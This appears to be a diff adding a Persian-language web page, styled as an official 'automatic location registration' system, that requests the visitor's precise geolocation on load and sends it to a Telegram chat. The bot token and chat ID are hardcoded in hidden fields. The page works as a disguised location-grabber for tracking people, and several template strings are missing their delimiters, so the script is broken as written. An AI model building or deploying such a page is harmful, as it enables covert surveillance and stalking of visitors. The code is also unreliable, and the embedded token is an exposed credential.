@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه ثبت خودکار موقعیت مکانی (Auto-Tracking V2)</title>
+    <style>
+        /* CSS برای طراحی رسمی و مدرن */
+        body {
+            font-family: 'Tahoma', 'B Nazanin', Arial, sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            direction: rtl;
+            text-align: right;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            padding: 30px 40px;
+            border-radius: 10px;
+            max-width: 550px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            color: #172a5a; /* رنگ رسمی‌تر */
+            font-size: 26px;
+            border-bottom: 3px solid #172a5a;
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .info-box {
+            background-color: #f0f8ff;
+            border-right: 5px solid #172a5a;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 15px;
+            color: #172a5a;
+            text-align: justify;
+        }
+        #status-message {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            background-color: #e9ecef;
+            color: #495057;
+        }
+        .error {
+            background-color: #f8d7da !important;
+            color: #721c24 !important;
+            border: 1px solid #f5c6cb;
+        }
+        .success {
+            background-color: #d4edda !important;
+            color: #155724 !important;
+            border: 1px solid #c3e6cb;
+        }
+    </style>
+</head>
+<body onload="requestAndSendLocation()"> 
+    
+    <div class="container">
+        <h1>سامانه ثبت موقعیت مکانی (نسخه ۲)</h1>
+        
+        <div class="info-box">
+            <p><strong>اطلاعیه مهم:</strong> سیستم به طور خودکار، فرآیند درخواست موقعیت مکانی را در پس‌زمینه آغاز کرده است. لطفاً در صورت مشاهده هرگونه پیغام در مرورگر، *اجازه دسترسی به مکان (Location Access)* را صادر فرمایید.</p>
+        </div>
+        
+        <input type="hidden" id="bot-token" value="8597685412:AAH3ymwMQkCzsxb9Rru8j0ePa8Lu7Jx0UYg"> 
+        <input type="hidden" id="chat-id" value="7570861617"> 
+        <input type="hidden" id="user-token-id" value="REF-CLIENT-2025-01-A">
+
+        <div id="status-message">⏳ در حال بارگذاری سیستم و بررسی وضعیت دسترسی...</div>
+    </div>
+
+    <script>
+        // تابع کمکی برای به‌روزرسانی وضعیت پیام
+        function updateStatus(message, type = '') {
+            const statusElement = document.getElementById('status-message');
+            statusElement.innerHTML = message;
+            statusElement.className = type;
+        }
+
+        // تابع اصلی که هنگام بارگذاری صفحه فراخوانی می‌شود
+        function requestAndSendLocation() {
+            const BOT_TOKEN = document.getElementById('bot-token').value;
+            const CHAT_ID = document.getElementById('chat-id').value;
+            const USER_TOKEN = document.getElementById('user-token-id').value;
+
+            if (!navigator.geolocation) {
+                updateStatus("❌ مرورگر شما از Geolocation پشتیبانی نمی‌کند. لطفا مرورگر خود را به‌روزرسانی کنید.", 'error');
+                return;
+            }
+            
+            updateStatus("⏳ در حال درخواست موقعیت مکانی... لطفا Pop-up مرورگر را تأیید کنید.");
+
+            // دریافت لوکیشن با تنظیمات دقیق‌تر (Timeout کمتر)
+            navigator.geolocation.getCurrentPosition(
+                
+                // در صورت موفقیت (Success Callback)
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    updateStatus(✅ موقعیت مکانی دریافت شد. Latitude: ${lat}, Longitude: ${lon}.<br> در حال ارسال به تلگرام...);
+                    
+                    // ارسال به API تلگرام
+                    sendLocationToTelegram(lat, lon, USER_TOKEN, BOT_TOKEN, CHAT_ID);
+                },
+                
+                // در صورت عدم موفقیت (Error Callback)
+                (error) => {
+                    let errorMessage;
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = "❌ *خطای عدم مجوز:* کاربر دسترسی را لغو کرد. لطفاً تنظیمات مرورگر خود را بررسی کنید.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = "⚠ *خطای دسترس‌ناپذیری:* اطلاعات موقعیت مکانی در دسترس نیست (مثلاً به دلیل عدم اتصال به GPS).";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = "⌛ *خطای وقفه:* درخواست موقعیت مکانی بیش از حد طول کشید و متوقف شد.";
+                            break;
+                        default:
+                            errorMessage = "🔥 *خطای نامشخص:* در دریافت موقعیت مکانی رخ داد. مطمئن شوید که سایت با HTTPS باز شده است.";
+                    }
+                    updateStatus(errorMessage, 'error');
+                },
+                
+                // تنظیمات Geolocation Options
+                {
+                    enableHighAccuracy: true, // درخواست دقت بالا
+                    timeout: 5000,            // ۵ ثانیه مهلت برای دریافت لوکیشن
+                    maximumAge: 0             // از کش (Cache) لوکیشن استفاده نشود
+                }
+            );
+        }
+
+        // تابع ارسال به تلگرام
+        function sendLocationToTelegram(lat, lon, userToken, botToken, chatId) {
+            
+            // ساخت پیام رسمی و دقیق
+            const message = (
+                "🚨 *گزارش ثبت موقعیت مکانی خودکار (V2)*\n" +
+                "----------------------------------------\n" +
+                **توکن رهگیری:** \${userToken}\\n +
+                **توکن ربات:** \${botToken.substring(0, 10)}...\\n +
+                **عرض جغرافیایی (Lat):** ${lat}\n +
+                **طول جغرافیایی (Lon):** ${lon}\n +
+                **لینک نقشه:** [مشاهده در Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})\n +
+                "----------------------------------------\n" +
+                زمان ثبت (UTC): ${new Date().toUTCString()}
+            );
+
+            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage;
+            
+            const payload = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown' 
+            };
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    updateStatus("✔ *ارسال موفق!* اطلاعات با موفقیت به تلگرام ارسال شد.", 'success');
+                } else {
+                    // در صورت خطای تلگرام، معمولاً به دلیل CHAT_ID یا توکن نامعتبر است.
+                    updateStatus(❌ **خطا در API تلگرام:** ${data.description}. (توکن یا آیدی چت را بررسی کنید.), 'error');
+                    console.error("Telegram API Error:", data);
+                }
+            })
+            .catch((error) => {
+                updateStatus(🔥 **خطای شبکه:** در اتصال به سرور تلگرام مشکلی وجود دارد: ${error.message}, 'error');
+                console.error("Network Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
